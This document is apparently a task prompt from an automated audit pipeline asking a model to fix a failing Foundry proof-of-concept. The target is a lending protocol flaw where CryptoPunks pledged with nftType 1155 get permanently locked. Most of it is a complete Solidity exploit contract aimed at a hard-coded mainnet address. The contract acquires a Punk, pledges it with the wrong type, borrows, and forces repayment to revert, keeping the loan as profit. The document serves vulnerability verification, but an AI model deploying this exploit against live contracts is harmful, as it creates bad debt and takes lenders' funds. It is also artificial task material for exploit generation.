You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: CryptoPunks can be pledged with `nftType=1155`, permanently locking wrapped collateral and enabling bad debt
- claim: `pledgeInternal()` converts CryptoPunks deposits into `wrappedPunks` but preserves the caller-supplied `_nftType`. A borrower can therefore deposit a Punk with `_nftType = 1155`, causing the order to record an ERC721 wrapped punk as ERC1155 collateral. Every later collateral transfer path uses `order.nftType`, so withdrawals, repay-claims, borrower redemption, liquidation settlement, and auction withdrawal all call the ERC1155 interface against `wrappedPunks` and revert.
- impact: Affected CryptoPunks collateral becomes permanently stuck inside `XNFT`. If the borrower also drew debt against the order, the protocol can be left with irrecoverable bad debt while the underlying Punk remains frozen in escrow.
- exploit_paths: ["Borrower calls `pledgeAndBorrow(address(punks), punkId, 1155, xToken, borrowAmount)`", "`_depositPunk()` wraps the Punk and `pledgeInternal()` rewrites `collection` to `wrappedPunks` but stores `nftType = 1155`", "Any later transfer path reaches `transferNftInternal(..., wrappedPunks, punkId, 1155)`", "`IERC1155Upgradeable(wrappedPunks).safeTransferFrom(...)` reverts because `wrappedPunks` is ERC721, permanently locking the collateral"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IXTokenLike {
    function underlying() external view returns (address);
    function borrowBalanceCurrent(uint256 orderId) external returns (uint256);
    function repayBorrow(uint256 orderId, address borrower, uint256 repayAmount) external payable;
}

interface IXNFTLike {
    function punks() external view returns (address);
    function wrappedPunks() external view returns (address);
    function controller() external view returns (address);
    function counter() external view returns (uint256);
    function pledgeAndBorrow(address collection, uint256 tokenId, uint256 nftType, address xToken, uint256 borrowAmount) external;
    function allOrders(uint256 orderId) external view returns (
        address pledger,
        address collection,
        uint256 tokenId,
        uint256 nftType,
        bool isWithdraw
    );
    function allLiquidatedOrder(uint256 orderId) external view returns (
        address liquidator,
        uint256 liquidatedPrice,
        address xToken,
        uint256 liquidatedStartTime,
        address auctionAccount,
        uint256 auctionPrice,
        bool isPledgeRedeem,
        address auctionWinner
    );
}

interface ICryptoPunksLike {
    function balanceOf(address account) external view returns (uint256);
    function punkIndexToAddress(uint256 punkIndex) external view returns (address owner);
    function buyPunk(uint256 punkIndex) external payable;
    function offerPunkForSaleToAddress(uint256 punkIndex, uint256 minSalePriceInWei, address toAddress) external;
    function punksOfferedForSale(uint256 punkIndex) external view returns (
        bool isForSale,
        uint256 punkIndexOffered,
        address seller,
        uint256 minValue,
        address onlySellTo
    );
}

contract FlawVerifier {
    address public constant TARGET = 0x39360AC1239a0b98Cb8076d4135d0F72B7fd9909;
    address internal constant ADDRESS_ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    uint256 internal constant SEARCH_LIMIT = 10_000;

    bool public executed;
    bool public hypothesisValidated;
    uint256 public infeasibleReason;

    bool public stageBorrowWith1155;
    bool public stageWrappedPunkRecordedAs1155;
    bool public stageLaterTransferPathAttempted;
    bool public stageLaterTransferPathReverted;

    uint256 public exploitedOrderId;
    uint256 public exploitedPunkId;
    address public exploitedXToken;
    uint256 public exploitedBorrowAmount;

    address internal _profitToken;
    uint256 internal _profitAmount;

    struct AttemptData {
        address underlying;
        uint256 balanceBefore;
        uint256 orderId;
        uint256 realizedBorrow;
    }

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IXNFTLike xnft = IXNFTLike(TARGET);
        address wrappedPunks = xnft.wrappedPunks();
        uint256 totalOrders = xnft.counter();

        if (totalOrders == 0) {
            infeasibleReason = 1;
            return;
        }

        address[] memory preferredXTokens = new address[](totalOrders);
        address[] memory fallbackXTokens = new address[](totalOrders);
        uint256 preferredCount;
        uint256 fallbackCount;

        for (uint256 orderId = 1; orderId <= totalOrders; ++orderId) {
            (, uint256 liquidatedPrice, address xToken,,,,,) = xnft.allLiquidatedOrder(orderId);
            if (xToken == address(0) || liquidatedPrice == 0) {
                continue;
            }
            if (_contains(preferredXTokens, preferredCount, xToken) || _contains(fallbackXTokens, fallbackCount, xToken)) {
                continue;
            }

            (, address collection,,,) = xnft.allOrders(orderId);
            if (collection == wrappedPunks) {
                preferredXTokens[preferredCount++] = xToken;
            } else {
                fallbackXTokens[fallbackCount++] = xToken;
            }
        }

        if (preferredCount == 0 && fallbackCount == 0) {
            infeasibleReason = 2;
            return;
        }

        ICryptoPunksLike punksMarket = ICryptoPunksLike(xnft.punks());

        if (punksMarket.balanceOf(address(this)) != 0) {
            (bool foundOwned, uint256 ownedPunkId) = _findOwnedPunk(punksMarket);
            if (foundOwned && _tryCandidates(ownedPunkId, false, preferredXTokens, preferredCount, fallbackXTokens, fallbackCount)) {
                return;
            }
        }

        (bool foundFree, uint256 freePunkId) = _findFreePunk(punksMarket);
        if (!foundFree) {
            infeasibleReason = 3;
            return;
        }

        if (_tryCandidates(freePunkId, true, preferredXTokens, preferredCount, fallbackXTokens, fallbackCount)) {
            return;
        }

        infeasibleReason = 4;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _tryCandidates(
        uint256 punkId,
        bool needsFreePurchase,
        address[] memory preferredXTokens,
        uint256 preferredCount,
        address[] memory fallbackXTokens,
        uint256 fallbackCount
    ) internal returns (bool) {
        uint256[5] memory borrowSizes = [uint256(1), uint256(2), uint256(10), uint256(100), uint256(1_000)];

        for (uint256 i = 0; i < preferredCount; ++i) {
            for (uint256 j = 0; j < borrowSizes.length; ++j) {
                try this._attemptWithCandidate(punkId, needsFreePurchase, preferredXTokens[i], borrowSizes[j]) returns (bool ok) {
                    if (ok) {
                        return true;
                    }
                } catch {}
            }
        }

        for (uint256 i = 0; i < fallbackCount; ++i) {
            for (uint256 j = 0; j < borrowSizes.length; ++j) {
                try this._attemptWithCandidate(punkId, needsFreePurchase, fallbackXTokens[i], borrowSizes[j]) returns (bool ok) {
                    if (ok) {
                        return true;
                    }
                } catch {}
            }
        }

        return false;
    }

    function _attemptWithCandidate(
        uint256 punkId,
        bool needsFreePurchase,
        address xToken,
        uint256 borrowAmount
    ) external returns (bool) {
        require(msg.sender == address(this), "self only");

        IXNFTLike xnft = IXNFTLike(TARGET);
        ICryptoPunksLike punksMarket = ICryptoPunksLike(xnft.punks());

        if (needsFreePurchase) {
            (bool isForSale,, address seller, uint256 minValue, address onlySellTo) = punksMarket.punksOfferedForSale(punkId);
            require(isForSale, "punk no longer listed");
            require(seller != address(0), "invalid seller");
            require(minValue == 0, "punk no longer free");
            require(onlySellTo == address(0) || onlySellTo == address(this), "sale restricted");
            punksMarket.buyPunk(punkId);
        }

        require(punksMarket.punkIndexToAddress(punkId) == address(this), "punk not owned");

        // Realistic protocol-required setup: XNFT._depositPunk() purchases the offered Punk from
        // CryptoPunks itself, so the holder must first publicly offer the owned Punk to XNFT.
        punksMarket.offerPunkForSaleToAddress(punkId, 0, TARGET);

        AttemptData memory attempt;
        attempt.underlying = IXTokenLike(xToken).underlying();
        attempt.balanceBefore = _assetBalance(attempt.underlying);
        attempt.orderId = xnft.counter() + 1;

        // Path 0: borrow directly against a Punk while deliberately passing nftType=1155.
        xnft.pledgeAndBorrow(address(punksMarket), punkId, 1155, xToken, borrowAmount);
        stageBorrowWith1155 = true;

        _validateWrapped1155Order(xnft, attempt.orderId, punkId);
        stageWrappedPunkRecordedAs1155 = true;

        attempt.realizedBorrow = _assetBalance(attempt.underlying) - attempt.balanceBefore;
        require(attempt.realizedBorrow > 0, "no borrow proceeds");

        // Path 2 + 3: force an immediately reachable later collateral-transfer branch by trying to
        // repay from the freshly borrowed proceeds. A full repay causes XNFT.notifyRepayBorrow(),
        // which then calls transferNftInternal(address(this), pledger, wrappedPunks, punkId, 1155).
        // Because wrappedPunks is ERC721-only, that ERC1155 transfer path reverts and the repay rolls back,
        // leaving both the debt and the wrapped Punk stuck exactly as described in the finding.
        require(
            _triggerLockedTransferPath(attempt.orderId, xToken, attempt.underlying, attempt.realizedBorrow),
            "later transfer path not proven"
        );

        exploitedOrderId = attempt.orderId;
        exploitedPunkId = punkId;
        exploitedXToken = xToken;
        exploitedBorrowAmount = attempt.realizedBorrow;
        hypothesisValidated = true;
        _profitToken = _normalizeProfitToken(attempt.underlying);
        _profitAmount = attempt.realizedBorrow;

        return true;
    }

    function _validateWrapped1155Order(IXNFTLike xnft, uint256 orderId, uint256 punkId) internal view {
        (, address collection, uint256 recordedTokenId, uint256 nftType, bool isWithdraw) = xnft.allOrders(orderId);
        require(collection == xnft.wrappedPunks(), "collection not rewritten");
        require(recordedTokenId == punkId, "token id mismatch");
        require(nftType == 1155, "nftType not preserved");
        require(!isWithdraw, "unexpected withdrawn order");
    }

    function _triggerLockedTransferPath(
        uint256 orderId,
        address xToken,
        address underlying,
        uint256 maxRepayAmount
    ) internal returns (bool) {
        uint256 repayAmount = maxRepayAmount;

        try IXTokenLike(xToken).borrowBalanceCurrent(orderId) returns (uint256 exactDebt) {
            if (exactDebt == 0 || exactDebt > maxRepayAmount) {
                return false;
            }
            repayAmount = exactDebt;
        } catch {
            if (repayAmount == 0) {
                return false;
            }
        }

        stageLaterTransferPathAttempted = true;

        if (underlying != ADDRESS_ETH) {
            _approveERC20(underlying, xToken, 0);
            _approveERC20(underlying, xToken, repayAmount);
        }

        bytes memory payload = abi.encodeWithSelector(IXTokenLike.repayBorrow.selector, orderId, address(this), repayAmount);
        (bool success,) = underlying == ADDRESS_ETH ? xToken.call{value: repayAmount}(payload) : xToken.call(payload);

        if (success) {
            return false;
        }

        stageLaterTransferPathReverted = true;

        IXNFTLike xnft = IXNFTLike(TARGET);
        (, address collection,, uint256 nftType, bool isWithdraw) = xnft.allOrders(orderId);
        require(collection == xnft.wrappedPunks(), "order collection changed");
        require(nftType == 1155, "order nftType changed");
        require(!isWithdraw, "order unexpectedly withdrawn");
        return true;
    }

    function _findOwnedPunk(ICryptoPunksLike punksMarket) internal view returns (bool found, uint256 punkId) {
        for (uint256 i = 0; i < SEARCH_LIMIT; ++i) {
            if (punksMarket.punkIndexToAddress(i) == address(this)) {
                return (true, i);
            }
        }
    }

    function _findFreePunk(ICryptoPunksLike punksMarket) internal view returns (bool found, uint256 punkId) {
        for (uint256 i = 0; i < SEARCH_LIMIT; ++i) {
            (bool isForSale,, address seller, uint256 minValue, address onlySellTo) = punksMarket.punksOfferedForSale(i);
            if (!isForSale || seller == address(0) || minValue != 0) {
                continue;
            }
            if (onlySellTo == address(0) || onlySellTo == address(this)) {
                return (true, i);
            }
        }
    }

    function _assetBalance(address underlying) internal view returns (uint256) {
        if (underlying == ADDRESS_ETH) {
            return address(this).balance;
        }
        return IERC20Like(underlying).balanceOf(address(this));
    }

    function _normalizeProfitToken(address underlying) internal pure returns (address) {
        if (underlying == ADDRESS_ETH) {
            return address(0);
        }
        return underlying;
    }

    function _approveERC20(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _contains(address[] memory items, uint256 count, address candidate) internal pure returns (bool) {
        for (uint256 i = 0; i < count; ++i) {
            if (items[i] == candidate) {
                return true;
            }
        }
        return false;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: pledgeandborrow(address(punks), punkid, 1155, xtoken, borrowamount), pledgeinternal(), nfttype = 1155, transfernftinternal(..., wrappedpunks, punkid, 1155), ierc1155upgradeable(wrappedpunks).safetransferfrom(...); generated code does not cover paths indexes: 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
